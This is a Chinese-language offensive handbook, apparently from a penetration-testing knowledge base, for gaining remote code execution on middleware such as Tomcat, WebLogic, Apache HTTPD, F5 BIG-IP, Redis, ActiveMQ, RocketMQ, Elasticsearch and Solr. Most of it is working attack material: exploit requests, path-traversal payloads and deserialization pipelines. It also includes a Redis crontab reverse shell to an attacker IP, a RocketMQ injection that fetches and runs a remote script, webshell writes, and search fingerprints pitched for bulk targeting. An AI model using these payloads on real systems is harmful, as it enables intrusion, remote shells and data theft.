# 中间件 RCE 实战手册 (Master 2026)

> 更新时间: 2026-08-13 | 来源: 全网收集+授权实战验证+src-wiki全库4756篇POC归档
> 覆盖: Java应用服务器 / Web服务器 / 缓存消息搜索 / DevOps平台 / Java框架生态 / 内存马 / 2026新增预认证RCE
> 配套秒杀卡: `kb/quick-ref/midware-rce.md`（S1 指纹→N-Day 快速查）
> 完整POC库: `tools/knowledge_base/srcwiki_poc/`（24分类4756篇，含完整请求包+FOFA指纹）

---

## 目录

0. [2026 新增预认证 RCE 快照](#0-2026-新增预认证-rce-快照)
1. [Tomcat](#1-tomcat)
2. [WebLogic](#2-weblogic)
3. [JBoss / WildFly](#3-jboss--wildfly)
4. [WebSphere / Jetty / Resin / GlassFish](#4-websphere--jetty--resin--glassfish)
5. [Nginx / Apache / IIS / HTTP走私](#5-nginx--apache--iis--http走私)
6. [Redis](#6-redis)
7. [ActiveMQ / RocketMQ / RabbitMQ / Kafka](#7-activemq--rocketmq--rabbitmq--kafka)
8. [Elasticsearch / Kibana / Logstash](#8-elasticsearch--kibana--logstash)
9. [Apache Solr](#9-apache-solr)
10. [Flink / Spark / Storm / 流处理](#10-flink--spark--storm--流处理)
11. [Jenkins / Nacos / XXL-JOB / MinIO / DevOps平台](#11-jenkins--nacos--xxl-job--minio--devops平台)
12. [Confluence / GitLab / 协作平台](#12-confluence--gitlab--协作平台)
13. [Java框架生态 RCE](#13-java框架生态-rce)
14. [内存马 / 回显链 / JNDI 高版本绕过](#14-内存马--回显链--jndi-高版本绕过)
15. [通用 GetShell 链与工具](#15-通用-getshell-链与工具)

> 注: Tomcat/WebLogic/JBoss 已另有详版 `midware_rce_getshell.md`，此处列速查+新增CVE。

---

## 0. 2026 新增预认证 RCE 快照

> 来源: src-wiki CVE-2026 分类 92 篇 + 全库整合（2026-08-13 归档）
> 完整 POC 见 `tools/knowledge_base/srcwiki_poc/CVE-2026/`，此处列最高价值可落地目标

### 0.1 中间件/Web服务器 预认证 RCE（无前置条件优先）

| CVE | 产品 | 类型 | 触发 | 修复/备注 |
|-----|------|------|------|----------|
| CVE-2026-34486 | Apache Tomcat Tribes | EncryptInterceptor fail-open → 反序列化 RCE | 集群端口 4000 发 ysoserial CC6 | 9.0.116/10.1.53/11.0.20 |
| CVE-2026-42533 / 42945 / 9256 | Nginx | Pre-Auth Heap Overflow RCE（Two-Pass Capture Clobbering / ASLR独立链 PoolSlip×Rift） | HTTP 请求触发 | 最新版修复 |
| CVE-2026-23479 | Redis 7.2-8.6.2 | UAF → 任意代码执行 | authenticated + blocked client 驱逐时序（复杂） | 8.6.3，无公开POC |
| CVE-2026-42588 | Apache ActiveMQ | 见 srcwiki_poc/CVE-2026/4709.md | 61616 OpenWire | — |
| CVE-2026-44403 | WingFTP | Session 反序列化 RCE | 会话伪造 | — |
| CVE-2026-20841 | Windows RPC | Heap Overflow RCE | 远程 | — |

### 0.2 应用/平台 预认证 RCE（CVSS 9+）

| CVE | 产品 | 类型 | 关键路径/链 | CVSS |
|-----|------|------|------------|------|
| CVE-2026-39987 | Marimo Notebook | Pre-Auth RCE | 未授权端点 | 9.3 |
| CVE-2026-35031 | Jellyfin <10.11.7 | 路径遍历→LD_PRELOAD RCE | 字幕上传 Format 字段写 `/etc/ld.so.preload` | 9.9 |
| CVE-2026-20253 | Splunk Enterprise 10.2.3 | PostgreSQL sidecar 绕过→DB转储→lo_export写文件→RCE | `/__raw/v1/postgres/recovery/backup` 连接串注入 | 9.8 |
| CVE-2026-58138 | Conductor (Netflix) | GraalVM 未认证 RCE | — | — |
| CVE-2026-22812 | OpenCode | 未授权 RCE | — | — |
| CVE-2026-33539→33439 | OpenAM | Pre-Auth Java 反序列化 RCE | — | — |
| CVE-2026-6875 | ServiceNow AI Platform | Pre-Auth RCE | — | — |
| CVE-2026-50522 | SharePoint Server | 反序列化 RCE | — | — |
| CVE-2026-49009 | Mender Server | 路径穿越→RCE | — | — |

### 0.3 框架/开发链 RCE

| CVE | 产品 | 类型 | 备注 |
|-----|------|------|------|
| CVE-2026-16723 | **FastJson 1.2.68-1.2.83** | @JSONType resource probe → RCE（无需AutoType/gadget） | Spring Boot fat-JAR + jar:http整数IP，本地手册Ch13已有详版 |
| CVE-2026-52806 | Gogs | git rebase 参数注入 RCE | 认证后 |
| CVE-2026-33937 | Handlebars.js | AST 注入 RCE | — |
| CVE-2026-47480→53519 | Nezha Monitoring | 路径穿越+JWT伪造接管 | — |
| CVE-2026-45247 | Mirasvit Cache Warmer | PHP 对象注入 RCE | — |
| CVE-2025-66478 | Next.js RSC | Pre-Auth RCE（React2Shell） | — |

### 0.4 高价值利用链速查（FOFA 指纹见 POC 文件）

```
# Jellyfin CVE-2026-35031 最短验证（认证+字幕权限）
POST /Videos/{id}/Subtitles  Format="/../../../etc/ld.so.preload"
# Splunk CVE-2026-20253
POST /en-US/splunkd/__raw/v1/postgres/recovery/backup  hostaddr=attacker.db
# Tomcat Tribes CVE-2026-34486
python3 exploit.py --target $HOST --port 4000 --payload payload.bin  (CC6)
```

> ⚠️ CVE-2026 分类其余 80+ 篇（FreePBX/Next.js/Redis/Dolibarr/FortiSandbox/n8n/Gitea/Nginx UI/HAXcms 等）见 `srcwiki_poc/CVE-2026/_index.md`。
>
> 📌 **2022-2026 全量新增 CVE 索引**（本手册未覆盖的 117 个高危）见：
> `tools/knowledge_base/rce_getshell/kb_middleware_cve_index_2022_2026.md`
> 含产品分组速查表 + 每个 CVE 的 POC 文件路径（Vite/CrushFTP/GlassFish/Rejetto/ColdFusion/GeoServer/Openfire/Django/Laravel 等）

---

## 1. Tomcat

> 详细版见 `midware_rce_getshell.md`（Manager弱口令+WAR部署 / CVE-2017-12615 / GhostCat / CVE-2019-0232 / Session反序列化 / 内存马）

**速查链：**
| CVE | 类型 | 端点 | 条件 |
|-----|------|------|------|
| CVE-2017-12615 | PUT写shell | `PUT /shell.jsp/` | Windows 或末尾`/`，readonly=false |
| CVE-2020-1938 | AJP文件读→RCE | 8009 AJP | 无认证 |
| CVE-2019-0232 | CGI RCE | CGI Servlet | Windows+enableCmdLineArguments |

**2024-2026 新CVE（版本号以 Apache 官方公告为准）：**
| CVE | 类型 | 触发条件 | 修复 |
|-----|------|---------|------|
| CVE-2025-24813 | **Partial PUT 写文件→RCE** | 部署含写权限 + partial PUT → 追加 JSP 到已部署应用 | 9.0.101/10.1.36/11.0.3 |
| CVE-2025-46701 | 24813 补丁绕过（敏感文件读/写） | 同场景，2025-06 | 9.0.102/10.1.37/11.0.4 |
| CVE-2025-43564 | **Partial PUT RCE**（同族最严重） | 同 partial PUT 写 JSP 链，2025-10 | 9.0.108/10.1.41/11.0.6 |
| CVE-2025-55752 | partial PUT 系列变体 | 同上 | 见官方公告 |
| CVE-2024-50379 | JSP 编译 TOCTOU→文件覆盖 RCE | 大小写不敏感 FS + default servlet 可写（非默认） | 9.0.98/10.1.34/11.0.2，跟进 56337 |
| CVE-2024-21733/24549 | HTTP/2 TLS 握手内存耗尽 DoS | 非 RCE，仅 DoS | 9.0.84/8.5.98 等 |

**Partial PUT 速查**（2025 系列核心）:
```
# 场景: 已部署应用目录可写（如解压目录 + PUT 允许）
PUT /app/shell.jsp  (或 Partial Content 追加片段到现有 jsp)
→ 写入 webshell → 直接 getshell
检测: OPTIONS / 看 Allow 是否含 PUT / 响应 201 而非 405
```

---

## 2. WebLogic

> 详细版见 `midware_rce_getshell.md`（wls-wsat / T3 JNDI / Console RCE）

**速查链：**
| CVE | 类型 | 端点 | 条件 |
|-----|------|------|------|
| CVE-2020-14882/14883 | Console未授权RCE | `/console/css/..%2f..%2fconsole.portal` | 无认证 |
| CVE-2023-21839→2024-20931→2024-21182 | T3/IIOP JNDI | 7001 | 无认证 |
| CVE-2017-10271 | wls-wsat XMLDecoder | `/wls-wsat/CoordinatorPortType` | 无认证 |

**2024-2026 新CVE：**
| CVE | 类型 | 触发条件 | 修复 |
|-----|------|---------|------|
| CVE-2025-21535 | **JDK 高版本反序列化 RCE**（2025-05，CVSS 9.9） | 无认证，T3/IIOP 远程反序列化；JRockit/Sun 不同链 | 2025年4月CPU后 |
| CVE-2024-21182 | OpaqueReference 反序列化 RCE | T3/IIOP 投递恶意序列化对象（同族连发 21839→20931→21182） | 2024-04 CPU |
| CVE-2020-2551 | IIOP RMI 反序列化 RCE | 7001 IIOP 端口无认证 | 2020-01 CPU |
| CVE-2019-2725 | wls9_async_response 反序列化 RCE | `/_async/AsyncResponseService` 无认证 | 2019-04 |

**通用利用工具**: WeblogicTool / WeblogicExploit GUI / ysoserial + JNDIExploit；`-useJavaSerialization` 绕过协议

---

## 3. JBoss / WildFly

> 详细版见 `midware_rce_getshell.md`（CVE-2017-12149 / 7504 / JMX-Console 部署war）

**速查链：**
| CVE | 类型 | 端点 | 条件 |
|-----|------|------|------|
| CVE-2017-12149 | 反序列化RCE | `/invoker/JMXInvokerServlet` | 无认证 |
| CVE-2017-7504 | 反序列化RCE | `/invoker/readonly/JMXInvokerServlet` | 无认证 |

**WildFly 新CVE：**
| CVE | 类型 | 触发条件 | 修复 |
|-----|------|---------|------|
| CVE-2025-2251 | **EJB 反序列化 RCE**（2025-03，CVSS 8.8） | wfly-remote 远程 EJB 接口反序列化不可信对象 → RCE | WildFly 若干版本，见公告 |
| CVE-2023-5715 | EJB 类加载信息泄露（辅助） | EJB 本地类路径读 class 内容 → 配合反序列化链 | 2023-12 修复 |

---

## 4. WebSphere / Jetty / Resin / GlassFish

### 4.1 IBM WebSphere

#### CVE-2025-36038 — 未授权反序列化 RCE（2025最新，CVSS 9.0）
- **影响版本**: WAS 8.5.0.0–8.5.5.27 / 9.0.0.0–9.0.5.24（修复 8.5.5.28/9.0.5.25）
- **条件**: 无认证远程可达；CWE-502 类型校验缺失
- **FOFA**: `app="IBM-WebSphere-Application-Server"` / `body="IBM WebSphere"`

#### CVE-2025-14914 — Liberty restConnector 路径穿越→RCE
- **条件**: 需 `restConnector-1.0/2.0` feature + 特权用户（管理面）；上传含 `../` zip → 覆盖任意文件 → RCE
- **检测**: `GET /ibm/api/config` 判定 restConnector

#### CVE-2020-4450 — IIOP/CORBA 反序列化 RCE（经典可打，ZDI-20-689）
- **条件**: 无认证，IIOP 端口可达（2809/9100/9402/9403）
- **利用链**: `WSIFPort_EJB`（JNDI）→ `WSIFServiceObjectFactory`（远程 XML 初始化，className=javax.el.ELProcessor）→ `WSIFClientProxy` → `findByPrimaryKey()` 触发 `ELProcessor.eval()` → EL 注入 RCE
- **FOFA**: `protocol="iiop"` / `port="2809"`
- **同族**: CVE-2020-4457/4290/4815（2020年同批 IIOP 反序列化/信息泄露家族）

#### CNVD-2021-30167 — 管理控制台 SSRF→RCE
- **条件**: 控制台可达（9060/9043）；Universal Deployment 远程部署 fetch 恶意 EAR/WAR → getshell
- **检测**: 访问 `/ibm/console/logon.jsp` 判定控制台

#### CVE-2015-7450 — Apache CC 反序列化 RCE（KEV）
- **影响版本**: WAS 6.2/7.0/8.0/8.5.0-8.5.5.7；SOAP 8880 / RMI/IIOP
- **利用链**: `java -jar ysoserial.jar CommonsCollections1 "cmd /c whoami" | curl -X POST --data-binary @- http://target:8880/`（Windows 下 SYSTEM）
- **MSF**: `exploit/windows/misc/ibm_websphere_java_deserialize`

### 4.2 Jetty

#### CVE-2021-34429 / CVE-2021-28164 — URI 编码路径穿越→WEB-INF 泄露（→RCE链）
- **影响版本**: 9.4.37-9.4.42 / 10.0.1-10.0.5 / 11.0.1-11.0.5（修复 9.4.43/10.0.6/11.0.6）
- **利用链**: `GET /%u002e/WEB-INF/web.xml`、`GET /.%00/WEB-INF/web.xml`、`GET /concat?/%2557EB-INF/web.xml`（ConcatServlet 双编码）→ 读 web.xml 拿凭据/源码 → 组合 RCE
- **检测**: `curl -i "http://TARGET/%u002e/WEB-INF/web.xml"` 非 404 且回显 xml
- **⚠️ 纠正**: CVE-2019-13109 是 Exiv2（图像库）非 Jetty；Jetty 无独立"目录遍历直接 RCE"CVE，走 WEB-INF 泄露链

### 4.3 GlassFish / Payara

#### CVE-2017-1000028 — UTF-8 过编码路径穿越→任意文件读→getshell
- **影响版本**: GlassFish OSE 4.1 及更早
- **利用链**: `%c0%ae`→`.`、`%c0%af`→`/` 过编码:
  ```
  GET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/.../etc/passwd
  ```
  读 `domains/domain1/config/admin-keyfile` 拿 admin 凭据 → 登录 4848 → 部署 WAR → RCE
- **FOFA**: `app="GlassFish"` / `body="GlassFish Server"`

#### CVE-2022-22965 Spring4Shell — GlassFish/Payara 波及
- **利用链**: `class.module.classLoader.resources.dirContext.docBase` 属性写/读文件（Snyk 确认 Payara 5.2022.1 可打）

#### Jackson 多态反序列化（GlassFish/Payara）
- CVE-2018-14719（<2.9.7）；CVE-2026-54512/54513（2026最新，CVSS 9.2/9.3，PTV 不校验泛型参数 + allowIfSubTypeIsArray 只校验 isArray）
- **检测**: 向 JSON 端点投递 `["com.sun.rowset.JdbcRowSetImpl", {...}]` type-id 载荷观察 JNDI

### 4.4 Resin
- 无公开反序列化 RCE；仅历史路径穿越（CVE-2006-2438/2007-2440）+ 弱口令部署组合链

---

## 5. Nginx / Apache / IIS / HTTP走私

### 5.1 Apache HTTPD

#### CVE-2021-41773 / CVE-2021-42013 — 路径穿越→CGI RCE（FOFA 大杀器）
- **影响版本**: 41773: 2.4.49；42013: 2.4.49/2.4.50（绕过补丁）
- **利用链**:
  ```
  # 41773 穿越读文件（无CGI时）
  GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  # 42013 双编码（绕过 41773 补丁）
  GET /cgi-bin/.%%32%65/%%32%65/%%32%65/%%32%65/etc/passwd
  # CGI 开启时直接 RCE（mod_cgi 配置了 ScriptAlias /cgi-bin/）
  curl "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo; id"
  ```
- **FOFA**: `server="Apache/2.4.49"` / `server="Apache/2.4.50"` 直接批量打
- **检测**: `curl -s --path-as-is "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"` 非 404 即中

#### CVE-2021-40438 — mod_proxy SSRF→（AJP→）RCE
- 带 `unix:/` + `;unix:/` 的 `RewriteRule` 代理路径注入，可 AJP 打内网 Tomcat（配合 GhostCat CVE-2020-1938）

#### CVE-2019-0211 / CVE-2019-0215 — 提权链
- 0211: root 权限 apache 进程 Mutex 权限利用→提权 root；0215: mod_prefork 本地提权。**需先 getshell**

#### 其他可打面
- **CVE-2021-25690**: mod_proxy 改请求行走私/CRLF 注入 → 配合 `RewriteRule` 可把请求转发到内部任意后端 → 组合 RCE
- **CVE-2022-38474/38475/38476**: mod_proxy 编码绕过 / mod_sed 过滤器后 Response Splitting / XSS（低危为主，38474 可配合走私）

#### .htaccess 链（拿到写权限后）
```
.htaccess → SetHandler application/x-httpd-php → 上传 .txt 解析为 PHP → RCE
```

### 5.2 Nginx

#### off-by-slash / alias 路径穿越（配置不当，高频）
- **利用链**: `location /files { alias /var/www/files/; }` → `GET /files../etc/passwd` 绕过 alias 尾斜杠
- **变体**: `proxy_pass` 无尾斜杠 + 用户可控 URI → 访问上游任意路径
- **检测**: `curl "http://TARGET/files../etc/passwd"` 非 404

#### CVE-2017-7529 — 整数溢出信息泄露（旧）
- Range 头 `-9223372036854775808-` → 读 600MB+ 缓存头信息（一般泄露 conf/证书，配合其他链）

#### CVE-2021-23017 — resolver DNS 栈溢出 DoS（无 RCE 实证）
- resolver 配置 + DNS 响应超长 CNAME → DoS。**注意**: 无可靠 RCE，不当作 getshell 主链

#### Nginx 集成面（高频 RCE 载体）
- **lua-nginx-module / OpenResty**: lua 脚本命令注入/反序列化 → RCE
- **nginx-ingress (K8s)**: 注解拼 upsteam conf → 配置注入 → SSRF/穿越；CVE-2021-25748/25749（K8s ingress 校验绕过）
- **header 传递**: 配了 `proxy_pass http://$http_host` / `$request_uri` 直接进后端 → 走私/CRLF 注入

### 5.3 IIS

#### CVE-2017-7269 — WebDAV 缓冲区溢出 RCE（老系统）
- **条件**: IIS 6.0 + WebDAV 开启，`PROPFIND` 到 `/.cab` 触发
- **MSF**: `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
- **FOFA**: `app="Microsoft-IIS" && port="80"` + 探 `PROPFIND`

#### CVE-2021-31166 — http.sys 溢出（DoS，UAF）
- Windows 10/Server 2004/20H2；可 DoS，RCE 实证弱 → 不作为 getshell 主链

#### ViewState 反序列化（ASP.NET，高频）
- **触发**: 无 MAC 校验（`machineKey` 泄露/默认）→ 伪造 ViewState 投递 ysoserial.net 载荷 → 后端反序列化 RCE
- **前置**: 拿到 `machineKey`（web.config 泄露 / IIS appSettings 暴露）或 `ViewStateMac` 禁用
- **工具**: ysoserial.net ViewState plugin + .NET GadgetChain（TextFormattingRunProperties 等）

#### 短文件名泄露 → 爆破（信息搜集辅助）
- `GET /*~1*/.aspx` 8.3 短名枚举 → 定位后台 → 弱口令

### 5.4 F5 BIG-IP

#### CVE-2022-1388 — 认证绕过→任意命令执行（高危常用）
- **条件**: iControl REST 接口（443）+ 无认证可达 + `X-FORWARDED-BY`/`X-CIPHER` 头构造
- **利用**:
  ```
  POST https://TARGET/mgmt/tm/util/bash HTTP/1.1
  Authorization: Basic YWRtaW46 (admin 空密码)
  X-FORWARDED-BY: 127.0.0.1
  Content-Length: 45
  {"command":"run","utilCmdArgs":"-c id"}
  ```
- **FOFA**: `app="F5-BIG-IP"` / `body="F5 BIG-IP"`

#### CVE-2020-5902 — TMUI 路径穿越→RCE
- **利用**: `/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user` → tmsh 命令执行
- **FOFA**: `app="F5-BIG-IP" && port="443"`

#### CVE-2020-3161 — AJP 走私 RCE（CVE-2020-5902 补丁绕过）
- TMSH 路径穿越变体写属性文件 → 本地文件包含 → 配合 `RequestUtil.substringAfter` 属性注入

#### CVE-2019-10149 / CVE-2016-6348 — 历史
- 10149: TMSH 认证绕过 RCE；6348: SSO 认证绕过（DoD 环境）

### 5.5 HTTP 请求走私

**判型信号**: 目标前有反代/CDN/LB（Server 头为 nginx/Apache/HAProxy/Cisco ACE）+ 两个处理层解析差异

#### CL.TE / TE.CL / TE.TE
```
CL.TE: 发送端 Content-Length: 13 + Transfer-Encoding: chunked，前端按 CL 截断 → 后端按 chunk 解析 → 拼接下一请求
检测:  发送 [POST / HTTP/1.1 ... CL: 4 \n TE: chunked \n 5c\r\nGPOST /... ] 观察后端是否把 GPOST 当新请求行（502/响应差异）
```
- **工具**: `smuggler.py` / Burp Extender `HTTP Request Smuggler`

#### CVE-2025-55315 — Kestrel/ASP.NET 走私（2025）
- HTTP/2→HTTP/1.1 降级时 `Content-Length`+`Transfer-Encoding` 共存解析错位

#### CVE-2023-32094 / CVE-2023-6827 — 高速走私利用链
- 32094: ASP.NET/IIS 前缀匹配走私；6827: Tomcat 走私 + 请求拆分缓存投毒（配合 `header` 污染可批量命中后端）

#### 走私→后端 RCE 组合
```
走私（绕过前端 ACL/WAF）→ 打到内部管理端口 / Tomcat Manager / Spring Actuator → 直接 RCE
或: 走私拼接 → Cache Poisoning 投毒给其他用户 → 挂 XSS/后门
```

### 5.6 其他反向代理/入口
- **Apache Traffic Server**: CVE-2021-44141/44142 配置越权/走私；CVE-2024-45858 HTTP/2→1.1 走私
- **HAProxy**: CVE-2021-40346 integer overflow（`Content-Length: -1` 走私）
- **Cisco ACE/AnyConnect**: 历史走私常用（CVE-2018-0229 等）

---

## 6. Redis

### 6.1 CVE-2025-49844 — RediShell Lua UAF RCE（★★★ 2025最热）
- **影响版本**: OSS/CE <8.2.2 / <8.0.4 / <7.4.6 / <7.2.11 / <6.2.20；埋藏约13年
- **利用条件**: TCP 6379。默认无认证即可未授权利用；有认证需能执行 Lua (`EVAL`/`SCRIPT`)
- **端点**: Redis 协议 `EVAL` / `EVALSHA` / `SCRIPT LOAD`
- **利用链**: 构造 Lua 脚本触发 GC 后 UAF → 逃逸 Lua 沙箱 → 原生代码执行（Pwn2Own Berlin 2025 披露，2025-10-03 修复）
- **FOFA**: `app="redis-server" && port="6379"`（公网约33万Redis，约6万无认证）
- **检测**: `redis-cli -h IP -p 6379 PING` 返回 `+PONG` 即未授权；`INFO server` 看版本

### 6.2 CVE-2025-32023 — HyperLogLog 整数溢出 OOB 写 → RCE
- **影响版本**: 2.8 ~ <8.0.3 / <7.4.5 / <7.2.10 / <6.2.19；Valkey <8.1.3/8.0.4
- **条件**: 可执行 `PFADD/PFCOUNT/PFMERGE`（CVSS 7.8）；公开 PoC: Exploit-DB 52477
- **利用链**: 特殊字符串触发 hllMerge() 整数溢出 → 栈/堆越界写 → 控制返回地址
- **缓解**: `ACL SETUSER <u> -pfadd -pfcount -pfmerge`

### 6.3 CVE-2025-62507 — XACKDEL 栈溢出 RCE
- **影响版本**: Redis 8.2.0（官方 Docker 无 stack canary）
- **利用链**: `XACKDEL` 第53个 stream ID 覆盖返回地址（CVSS 7.7）

### 6.4 CVE-2024-46981 / CVE-2024-31449 — Lua GC操纵 / 栈溢出
- **46981**: 所有带Lua版本，修复于 <7.4.2/<7.2.7/<6.2.17
- **31449**: >=7.4.0<7.4.1 / >=7.2.0<7.2.6 / >=6.2.0<6.2.16（Lua库命令栈溢出）

### 6.5 CVE-2022-0543 — Debian 打包版 Lua 沙箱逃逸 RCE（CVSS 10.0）
- **条件**: Debian/Ubuntu 打包 Redis ≥2.2 且 <5.0.13/<6.0.15/<6.2.5，未授权或可EVAL
- **利用链**:
  ```
  eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
  ```

### 6.6 主从复制加载恶意 .so → RCE（redis-rogue-server）
- **条件**: 未授权 + CONFIG/SLAVEOF/MODULE LOAD 可用；Redis ≤5.0.5 最佳
- **利用链**:
  1. `python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATT --lport 6381`
  2. 目标 `SLAVEOF ATT_IP 6381` → 全量同步接收伪装RDB的恶意 `exp.so`
  3. `CONFIG SET dbfilename exp.so` + `MODULE LOAD ./exp.so` → `system.exec` 命令执行
  4. 清理: `SLAVEOF NO ONE` + `MODULE UNLOAD`
- **工具**: n0b0dyCN/redis-rogue-server、CSpanias/redis-module-rce；MSF `redis_replication_cmd_exec`

### 6.7 未授权写 crontab / SSH key / webshell
- **写 crontab**（root 运行）:
  ```
  set x "\n* * * * * bash -i >& /dev/tcp/ATT_IP/8888 0>&1\n"
  config set dir /var/spool/cron/
  config set dbfilename root
  save
  ```
- **写 SSH key**: `dir /root/.ssh/` + `dbfilename authorized_keys`
- **写 webshell**: `dir /var/www/html/` + `dbfilename shell.php`

---

## 7. ActiveMQ / RocketMQ / RabbitMQ / Kafka

### 7.1 ActiveMQ CVE-2023-46604 — OpenWire 反序列化 RCE（★★★ 实战大量利用）
- **影响版本**: <5.15.16 / 5.16.0-5.16.6 / 5.17.0-5.17.5 / 5.18.0-5.18.2
- **条件**: TCP 61616 OpenWire，无认证（CVSS 9.8）
- **利用链**:
  1. 构造恶意 Spring XML (`poc.xml`) 含 ProcessBuilder 反弹shell
  2. `python3 -m http.server 8000` 托管 + `nc -nlvp 9001` 监听
  3. 发 OpenWire `ExceptionResponse`（0x1F），Throwable 指向 `ClassPathXmlApplicationContext` + XML URL
- **工具**: X1r0z/ActiveMQ-RCE、evkl1d/CVE-2023-46604；MSF 模块
- **FOFA**: `app="APACHE-ActiveMQ"` / `protocol="activemq"` / `port="61616"`
- **检测**: nc 连 61616 看 OpenWire 二进制 banner

### 7.2 ActiveMQ CVE-2016-3088 — Fileserver 写 webshell
- **影响版本**: 5.x <5.14.0（CVSS 10.0）
- **利用链**: Web 控制台 8161 `fileserver` 无认证
  ```
  PUT /fileserver/2.txt     # 上传jsp内容
  MOVE /fileserver/2.txt    # Destination: file:///opt/activemq/webapps/api/s.jsp
  # 访问 http://IP:8161/api/s.jsp?cmd=ls
  ```
- **备选**: 写 `/root/.ssh/authorized_keys`、`/etc/cron.d/root`
- **⚠️ 澄清**: CVE-2015-7559 是 **DoS 非 RCE**（ActiveMQConnection 远程 shutdown），不构成 RCE 结论

### 7.3 RocketMQ CVE-2023-33246 — Broker 命令注入 RCE（★★★）
- **影响版本**: ≤5.1.0 与 ≤4.9.5（CVSS 9.8）
- **条件**: Broker 10911 / NameServer 9876 暴露且无鉴权
- **利用链**（原生TCP，update config code 25）:
  ```
  {"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":395}filterServerNums=1
  rocketmqHome=curl http://ATT_IP/evil.sh | bash
  ```
- **工具**: Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT；MSF `apache_rocketmq_update_config`
- **FOFA**: `app="RocketMQ"` / `port="10911"` / `port="9876"`

### 7.4 RocketMQ CVE-2023-37582 — NameServer 命令注入（补丁绕过）
- **影响版本**: 5.1.1（33246 未修干净），修复于 4.9.7/5.1.2；`configStorePath` 属性注入

### 7.5 RocketMQ CVE-2024-23321 — 权限缺失信息泄露
- **影响版本**: ≤5.2.0；普通用户可读 admin 账密 → 接管控制台

### 7.6 RabbitMQ — 默认凭据 / Erlang Cookie RCE
- **管理口**: `http://IP:15672` `guest/guest` → 全站接管、建后门用户、读队列
- **Erlang Cookie RCE**: 拿到 `.erlang.cookie`（容器/Helm硬编码）→ 连 25672 `erl -remsh` + `os:cmd` 任意命令执行
- **FOFA**: `app="RabbitMQ"` / `protocol="amqp"` / `port="15672"`

### 7.7 Kafka Connect CVE-2023-25194 — JNDI 注入 RCE
- **影响版本**: Connect API 2.3.0≤v<3.4.0（CVSS 8.8）
- **利用链**: 8083 REST 创建 connector，`producer.override.sasl.jaas.config` 设 `JndiLoginModule` 指向攻击者 LDAP/RMI → JNDI 反序列化 RCE。Druid 集成 kafka-clients 同受影响
- **检测**: 未授权访问 `http://IP:8083/connectors` 返回列表即存在
- **FOFA**: `port="8083" && app="kafka-connect"`

### 7.8 ZooKeeper / Memcached — 未授权访问（数据面，无直接RCE）
- **ZK**: `echo envi | nc IP 2181` 返回 Environment 即未授权；4lw 命令读写 znode（篡改配置中心/Dubbo）
- **Memcached**: `nc IP 11211` + `stats` 返回版本即未授权；`stats cachedump` 枚举 key → 读 session/token/DB凭据 → 会话劫持

---

## 8. Elasticsearch / Kibana / Logstash

### 8.1 Kibana CVE-2025-25012/25015/25014 — 原型污染 → RCE（★★★ 2025 ES栈最热）
- **影响版本**: ≥8.15.0 <8.17.1（Viewer 即可）；8.17.1/8.17.2 需高级权限；修复于 8.17.3
- **条件**: 需登录 Kibana（任意低权限用户）（CVSS 9.9/9.9/9.1）
- **利用链**: 构造文件上传 + 特定 HTTP 请求触发原型污染 → 任意代码执行（25014 走 ML/reporting 端点）
- **FOFA**: `app="kibana"` / `port="5601"`
- **缓解**: `xpack.integration_assistant.enabled: false`

### 8.2 Elasticsearch CVE-2015-1427 — Groovy 沙箱逃逸 RCE（经典）
- **影响版本**: 1.3.0-1.3.7 / 1.4.0-1.4.2（1.6+ 默认禁用动态脚本）
- **利用链**: `POST /_search` script_fields:
  ```json
  {"size":1,"script_fields":{"lupin":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")","lang":"groovy"}}}
  ```
  纯Groovy绕过（无反射）: `"script":"def c=\"netstat -an\";c.execute().text"`
- **FOFA**: `app="Elasticsearch"` / `port="9200"`

### 8.3 Elasticsearch CVE-2014-3120 — MVEL 脚本 RCE
- **影响版本**: 1.1.x-1.3.x；`_search` 脚本 `lang=mvel` 直接 Runtime.exec，需有索引数据

### 8.4 Elasticsearch CVE-2025-37731 — PKI 域认证绕过（用户冒充）
- PKI realm 处理伪造客户端证书可冒充任意用户（非直接RCE，打通后续面）

### ⚠️ 重要澄清
- **CVE-2023-46624 在 Elasticsearch 上不存在**（全网无该编号记录）
- ES 本体近年无公开直接 RCE；真实 RCE 集中在 Kibana 原型污染（2025）
- Logstash 2025 仅 CVE-2025-37730（TLS 校验缺失 MitM，非 RCE）

---

## 9. Apache Solr

### 9.1 CVE-2024-45216 — PKIAuthenticationPlugin 认证绕过（★★★ 2024新增）
- **影响版本**: 5.3.0-8.11.3 / 9.0.0-9.6.x（修复于 8.11.4/9.7.0）（CVSS 9.8）
- **利用链**: 任意 Solr API URL 末尾追加"假路径结尾"，认证层鉴权后剥离 → 未认证直通 API → 配合 50292/50386 达 RCE
- **检测**: 启用认证的 Solr，请求路径后追加 `/_` 测试是否绕过 401
- **注意**: EPSS 0.94，公网 4.5 万实例受影响

### 9.2 CVE-2023-50292 — Schema Designer 配置集 RCE
- **影响版本**: 8.10.0≤v<8.11.3 / 9.0.0≤v<9.3.0（CVSS 7.5）
- **条件**: SolrCloud 集群模式 + 未开认证
- **利用链**: `/api/schema-designer/*` 创建 schema、上传恶意 configset → 加载外部库 → 任意代码执行

### 9.3 CVE-2023-50386 — Backup/Restore 上传 jar → RCE
- **影响版本**: 6.0.0≤v<8.11.3 / 9.0.0≤v<9.4.1
- **利用链**: ConfigSets API 上传恶意 .jar/.class → 备份到 ClassPath 目录 → 任意 configset 加载执行

### 9.4 CVE-2017-12629 — RunExecutableListener RCE（经典）
- **影响版本**: <7.1.0（无需认证访问 config API）:
  ```
  POST /solr/demo/config  {"add-listener":{"event":"postCommit","name":"x","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c","touch /tmp/pwned"]}}
  POST /solr/demo/update   # 触发 postCommit → 命令执行
  ```

